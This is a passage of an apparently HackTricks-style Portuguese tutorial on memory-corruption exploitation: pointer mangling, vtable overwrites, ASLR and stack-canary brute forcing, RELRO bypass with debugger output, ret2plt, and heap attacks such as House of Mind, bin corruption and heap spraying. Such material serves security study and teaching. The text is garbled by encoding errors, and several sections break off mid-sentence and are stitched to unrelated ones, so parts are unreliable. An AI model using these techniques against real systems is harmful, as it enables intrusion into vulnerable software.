Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** atr√°s de v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente, esse vetor de ataque √© **pouco √∫til, pelo menos em x86** e **x64\_86**.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a criptografia** porque **retornam o mesmo** que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **estranho explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`Longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o a **arquitetura vulner√°vel a esse ataque √© a mesma que acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o sendo chamada, o controle pode ser assumido. Ou voc√™ tamb√©m pode modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© uma matriz de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para a matriz de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, portanto, se uma **sobrescrita** do **VPtr** for alcan√ßada, ela poder√° ser **modificada** para **apontar** para um m√©todo fict√≠cio, para que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas preventivas e evas√µes**

**ASLR n√£o t√£o aleat√≥rio**

O PaX divide o espa√ßo de endere√ßos do processo em 3 grupos:

C√≥digo e dados iniciados e n√£o iniciados: .text, .data e .bss ‚Äî> 16 bits de entropia na vari√°vel delta\_exec, essa vari√°vel √© iniciada aleatoriamente com cada processo e √© adicionada aos endere√ßos iniciais

Mem√≥ria alocada por mmap() e bibliotecas compartilhadas ‚Äî> 16 bits, delta\_mmap

O stack ‚Äî> 24 bits, delta\_stack ‚Äî> Realmente 11 (do byte 10¬∫ ao 20¬∫ inclusive) ‚Äî>alinhado a 16 bytes ‚Äî> 524.288 poss√≠veis endere√ßos reais do stack

As vari√°veis de ambiente e os argumentos s√£o deslocados menos que um buffer no stack.

**Return-into-printf**

√â uma t√©cnica para transformar um estouro de buffer em um erro de string de formato. Consiste em substituir o EIP para que aponte para um printf da fun√ß√£o e passar como argumento uma string de formato manipulada para obter valores sobre o estado do processo.

**Ataque a bibliotecas**

As bibliotecas est√£o em uma posi√ß√£o com 16 bits de aleatoriedade = 65636 poss√≠veis endere√ßos. Se um servidor vulner√°vel chamar fork(), o espa√ßo de endere√ßos de mem√≥ria √© clonado no processo filho e permanece intacto. Portanto, pode-se tentar fazer uma for√ßa bruta na fun√ß√£o usleep() da libc passando "16" como argumento, de forma que quando demorar mais do que o normal para responder, essa fun√ß√£o ser√° encontrada. Sabendo onde est√° essa fun√ß√£o, pode-se obter delta\_mmap e calcular as outras.

A √∫nica maneira de ter certeza de que o ASLR funciona √© usando a arquitetura de 64 bits. L√° n√£o h√° ataques de for√ßa bruta.

**StackGuard e StackShield**

**StackGuard** insere antes do EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Ainda s√£o vulner√°veis recv(), memcpy(), read(), bcoy() e n√£o protege o EBP

**StackShield** √© mais elaborado que o StackGuard

Armazena em uma tabela (Global Return Stack) todos os endere√ßos EIP de retorno para que o estouro n√£o cause nenhum dano. Al√©m disso, ambas as dire√ß√µes podem ser comparadas para ver se houve um estouro.

Tamb√©m √© poss√≠vel verificar o endere√ßo de retorno com um valor limite, assim, se o EIP for para um local diferente do habitual, como o espa√ßo de dados, ser√° conhecido. Mas isso √© contornado com Ret-to-lib, ROPs ou ret2ret.

Como pode ser visto, o stackshield tamb√©m n√£o protege as vari√°veis locais.

**Stack Smash Protector (ProPolice) -fstack-protector**

O can√°rio √© colocado antes do EBP. Reorganiza as vari√°veis locais para que os buffers estejam nas posi√ß√µes mais altas e, portanto, n√£o possam sobrescrever outras vari√°veis.

Al√©m disso, faz uma c√≥pia segura dos argumentos passados acima da pilha (acima das vars locais) e usa essas c√≥pias como argumentos.

N√£o pode proteger matrizes com menos de 8 elementos ou buffers que fazem parte de uma estrutura do usu√°rio.

O can√°rio √© um n√∫mero aleat√≥rio retirado de "/dev/urandom" ou, caso contr√°rio, √© 0xff0a0000. √â armazenado em TLS (Thread Local Storage). Os threads compartilham o mesmo espa√ßo de mem√≥ria, o TLS √© uma √°rea que tem vari√°veis globais ou est√°ticas de cada thread. No entanto, em princ√≠pio, eles s√£o copiados do processo pai, embora o processo filho possa modificar esses dados sem modificar os do pai ou dos outros filhos. O problema √© que se o fork() for usado, mas n√£o for criado um novo can√°rio, todos os processos (pai e filhos) usar√£o o mesmo can√°rio. No i386, √© armazenado em gs:0x14 e no x86\_64, √© armazenado em fs:0x28

Essa prote√ß√£o localiza fun√ß√µes que t√™m buffer que podem ser atacados e inclui no in√≠cio da fun√ß√£o c√≥digo para colocar o can√°rio e c√≥digo no final para verific√°-lo.

A fun√ß√£o fork() realiza uma c√≥pia exata do processo pai, por isso, se um servidor da web chamar fork(), pode-se fazer um ataque de for√ßa bruta byte a byte at√© descobrir o can√°rio que est√° sendo usado.

Se a fun√ß√£o execve() for usada ap√≥s o fork(), o espa√ßo ser√° sobrescrito e o ataque n√£o ser√° mais poss√≠vel
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
  0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sem relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
  0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para o bin√°rio **sem relro**, podemos ver que o endere√ßo da entrada `got` para `fgets` √© `0x404018`. Olhando para os mapeamentos de mem√≥ria, vemos que ele est√° entre `0x404000` e `0x405000`, que tem as **permiss√µes `rw`**, o que significa que podemos ler e escrever nele. Para o bin√°rio **com relro**, vemos que o endere√ßo da tabela `got` para a execu√ß√£o do bin√°rio (pie est√° habilitado, ent√£o esse endere√ßo mudar√°) √© `0x555555557fd0`. No mapeamento de mem√≥ria desse bin√°rio, ele est√° entre `0x0000555555557000` e `0x0000555555558000`, que tem a mem√≥ria com a **permiss√£o `r`**, o que significa que s√≥ podemos ler dele.

Ent√£o, qual √© a **maneira de contornar**? O contorno t√≠pico que uso √© simplesmente n√£o escrever em regi√µes de mem√≥ria que o relro faz ser somente leitura e **encontrar uma maneira diferente de obter a execu√ß√£o de c√≥digo**.

Observe que, para que isso aconte√ßa, o bin√°rio precisa saber antes da execu√ß√£o os endere√ßos das fun√ß√µes:

* Lazy binding: o endere√ßo de uma fun√ß√£o √© procurado na primeira vez que a fun√ß√£o √© chamada. Portanto, a `GOT` precisa ter permiss√µes de grava√ß√£o durante a execu√ß√£o.
* Bind now: os endere√ßos das fun√ß√µes s√£o resolvidos no in√≠cio da execu√ß√£o e, em seguida, s√£o dadas permiss√µes somente leitura a se√ß√µes sens√≠veis como .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar se um programa usa Bind now, voc√™ pode fazer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Quando o bin√°rio √© carregado na mem√≥ria e uma fun√ß√£o √© chamada pela primeira vez, ele salta para a PLT (Procedure Linkage Table), daqui √© feito um salto (jmp) para a GOT e descobre que essa entrada n√£o foi resolvida (cont√©m um endere√ßo seguinte da PLT). Ent√£o, invoca o Runtime Linker ou rtfd para resolver o endere√ßo e salv√°-lo na GOT.

Quando uma fun√ß√£o √© chamada, a PLT √© chamada, ela tem o endere√ßo da GOT onde o endere√ßo da fun√ß√£o √© armazenado, ent√£o redireciona o fluxo para l√° e assim a fun√ß√£o √© chamada. No entanto, se for a primeira vez que a fun√ß√£o √© chamada, o que est√° na GOT √© a pr√≥xima instru√ß√£o da PLT, portanto, o fluxo segue o c√≥digo da PLT (rtfd) e descobre o endere√ßo da fun√ß√£o, salva na GOT e chama.

Ao carregar um bin√°rio na mem√≥ria, o compilador disse em que offset deve colocar os dados que devem ser carregados quando o programa √© executado.

Lazy binding -> O endere√ßo da fun√ß√£o √© procurado na primeira vez que essa fun√ß√£o √© chamada, ent√£o a GOT tem permiss√µes de grava√ß√£o para que, quando procurada, seja salva l√° e n√£o precise ser procurada novamente.

Bind now -> Os endere√ßos das fun√ß√µes s√£o procurados ao carregar o programa e as permiss√µes das se√ß√µes .got, .dtors, .ctors, .dynamic, .jcr s√£o alteradas para somente leitura. **-z relro** e **-z now**

Apesar disso, em geral, os programas n√£o s√£o complicados com essas op√ß√µes, ent√£o esses ataques ainda s√£o poss√≠veis.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> Para saber se usam o BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Tenta identificar as fun√ß√µes que copiam de um lugar para outro de forma insegura e trocar a fun√ß√£o por uma fun√ß√£o segura.

Por exemplo:\
char buf\[16];\
strcpy(but, source);

Identifica como inseguro e, em seguida, troca strcpy() por \_\_strcpy\_chk() usando o tamanho do buffer como tamanho m√°ximo a ser copiado.

A diferen√ßa entre **=1** ou **=2** √© que:

A segunda n√£o permite que **%n** venha de uma se√ß√£o com permiss√µes de grava√ß√£o. Al√©m disso, o par√¢metro para acesso direto de argumentos s√≥ pode ser usado se os anteriores forem usados, ou seja, s√≥ pode usar **%3$d** se antes tiver usado **%2$d** e **%1$d**

Para mostrar a mensagem de erro, usa-se o argv\[0\], ent√£o, se colocar nele o endere√ßo de outro lugar (como uma vari√°vel global), a mensagem de erro mostrar√° o conte√∫do dessa vari√°vel. P√°gina 191

**Substitui√ß√£o do Libsafe**

Ativado com: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Intercepta as chamadas a algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, e menos em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que se chame a fun√ß√£o strcpy@plt (da plt) e se aponte para a entrada da GOT e se copie o primeiro byte da fun√ß√£o para a qual se quer chamar (system()). Em seguida, faz-se o mesmo apontando para GOT+1 e copia-se o segundo byte de system()... No final, chama-se o endere√ßo armazenado na GOT que ser√° system()

**Falso EBP**

Para as fun√ß√µes que usam o EBP como registro para apontar para os argumentos ao modificar o EIP e apontar para system(), o EBP tamb√©m deve ter sido modificado para apontar para uma √°rea de mem√≥ria que tenha 2 bytes quaisquer e, em seguida, o endere√ßo a &‚Äù/bin/sh‚Äù.

**Jaulas com chroot()**

de
No caso de querer reutiliz√°-lo, seria atribu√≠do sem problemas. No caso de querer usar outro, seria atribu√≠do o mesmo espa√ßo, ent√£o ter√≠amos os ponteiros "fd" e "bk" falsificados com os dados que a reserva anterior escreveu.

**After free()**

Um ponteiro previamente liberado √© usado novamente sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas Unlink() e FrontLink() foram eliminadas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada a free() √© necess√°ria para provocar a execu√ß√£o de c√≥digo arbitr√°rio. Interessa buscar um segundo peda√ßo que pode ser desbordado por um anterior e liberado.

Uma chamada a free() provoca chamar public\_fREe(mem), este faz:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devolve um ponteiro para o endere√ßo onde come√ßa o peda√ßo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Em \[1] verifica o campo size do bit NON\_MAIN\_ARENA, o qual pode ser alterado para que a verifica√ß√£o retorne verdadeiro e execute heap\_for\_ptr() que faz um and em "mem" deixando os 2,5 bytes menos importantes como 0 (no nosso caso de 0x0804a000 deixa 0x08000000) e acessa 0x08000000->ar\_ptr (como se fosse um struct heap\_info).

Desta forma, se pudermos controlar um peda√ßo, por exemplo em 0x0804a000 e um peda√ßo em **0x081002a0** for liberado, podemos chegar ao endere√ßo 0x08100000 e escrever o que quisermos, por exemplo **0x0804a000**. Quando este segundo peda√ßo for liberado, encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr retorna o que escrevemos em 0x08100000 (pois √© aplicado a 0x081002a0 o and que vimos antes e da√≠ se obt√©m o valor dos 4 primeiros bytes, o ar\_ptr).

Desta forma, chama-se \_int\_free(ar\_ptr, mem), ou seja, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar o valor de av, pois √© o que escrevemos no peda√ßo que ser√° liberado.

Tal como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Portanto, se escrevermos em av->bins\[2] o valor de \_\_DTOR\_END\_\_-12 na √∫ltima instru√ß√£o, ser√° escrito em \_\_DTOR\_END\_\_ o endere√ßo do segundo peda√ßo.

Ou seja, no primeiro peda√ßo temos que colocar no in√≠cio muitas vezes o endere√ßo de \_\_DTOR\_END\_\_-12 porque √© de l√° que av->bins\[2] o extrair√°.

No endere√ßo em que o endere√ßo do segundo peda√ßo cair com os √∫ltimos 5 zeros, deve-se escrever o endere√ßo deste primeiro peda√ßo para que heap\_for\_ptr() pense que o ar\_ptr est√° no in√≠cio do primeiro peda√ßo e retire de l√° o av->bins\[2].

No segundo peda√ßo e gra√ßas ao primeiro, sobrescrevemos o prev\_size com um jump 0x0c e o size com algo para ativar -> NON\_MAIN\_ARENA.

A seguir, no peda√ßo 2, colocamos um monte de nops e, finalmente, a shellcode.

Desta forma, ch
bin->bk = bck; O pen√∫ltimo peda√ßo se torna o √∫ltimo, caso bck aponte para a pilha no pr√≥ximo peda√ßo reservado, ele receber√° este endere√ßo.

bck->fd = bin; A lista √© fechada fazendo com que ela aponte para bin.

S√£o necess√°rios:

Dois mallocs devem ser reservados, de modo que o primeiro possa ser estourado depois que o segundo tenha sido liberado e introduzido em seu bin (ou seja, um malloc maior que o segundo peda√ßo deve ser reservado antes de estourar).

O malloc reservado para o qual o atacante escolheu o endere√ßo deve ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos estourar um heap que tenha um peda√ßo liberado abaixo dele e em seu bin, podemos alterar seu ponteiro bk. Se alterarmos seu ponteiro bk e esse peda√ßo se tornar o primeiro da lista de bin e for reservado, bin ser√° enganado e ser√° informado de que o √∫ltimo peda√ßo da lista (o pr√≥ximo a ser oferecido) est√° no endere√ßo falso que escolhemos (na pilha ou GOT, por exemplo). Portanto, se outro peda√ßo for reservado e o atacante tiver permiss√µes nele, ele receber√° um peda√ßo na posi√ß√£o desejada e poder√° escrever nela.

Depois de liberar o peda√ßo modificado, √© necess√°rio reservar um peda√ßo maior do que o liberado, para que o peda√ßo modificado saia dos unsorted bins e seja introduzido em seu bin.

Uma vez em seu bin, √© hora de modificar seu ponteiro bk por meio do estouro para que ele aponte para o endere√ßo que queremos sobrescrever.

Assim, o bin deve esperar sua vez at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane bin fazendo-o acreditar que o pr√≥ximo peda√ßo est√° no endere√ßo falso. E ent√£o o peda√ßo que nos interessa ser√° dado.

Para que a vulnerabilidade seja executada o mais r√°pido poss√≠vel, o ideal seria: reserva do peda√ßo vulner√°vel, reserva do peda√ßo que ser√° modificado, este peda√ßo √© liberado, um peda√ßo maior do que o que ser√° modificado √© reservado, o peda√ßo √© modificado (vulnerabilidade), um peda√ßo do mesmo tamanho que o vulner√°vel √© reservado e um segundo peda√ßo do mesmo tamanho √© reservado e este ser√° o que aponta para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o peda√ßo "n√£o" √© falso: verifica-se se bck->fd est√° apontando para victim. Ou seja, em nosso caso, se o ponteiro fd\* do peda√ßo falso apontado na pilha est√° apontando para victim. Para ultrapassar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente na pilha) no endere√ßo adequado o endere√ßo de victim. Para que pare√ßa um peda√ßo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e alguns mais, al√©m disso, os peda√ßos reservados devem ser maiores que 512.

O ataque √© como o anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas a malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do peda√ßo modificado de forma que esse tamanho - nb seja < MINSIZE.

Por exemplo, colocar em tamanho 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque um unsigned √© comparado)

Al√©m disso, um patch foi introduzido para torn√°-lo ainda mais complicado.

**Heap Spraying**

Basicamente, consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preench√™-los com um colch√£o de nops terminados por uma shellcode. Al√©m disso, como colch√£o, usa-se 0x0c. Pois tentaremos saltar para o endere√ßo 0x0c0c0c0c, e assim, se algum ponteiro for sobrescrito e chamado com este colch√£o, ele saltar√° para l√°. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se algum ponteiro √© sobrescrito e saltar para 0x0c0c0c0c esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em semear a mem√≥ria por meio de reservas e libera√ß√µes de forma que peda√ßos reservados fiquem entre peda√ßos livres. O buffer a ser estourado ser√° colocado em um dos ovos.

**objdump -d executable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obter o endere√ßo da fun√ß√£o\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver se √© realmente nossa shellcode e obter os OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela de s√≠mbolos, para obter o endere√ßo de vari√°veis e fun√ß√µes\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para obter o endere√ßo de fun√ß√µes de bibliotecas (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obt√©m o endere√ßo de puts a ser sobrescrito no GOT\
**objdump -D ./exec** ‚Äî> Disas ALL at√© as entradas da plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informa√ß√µes da fun√ß√£o no gdb

## Cursos interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
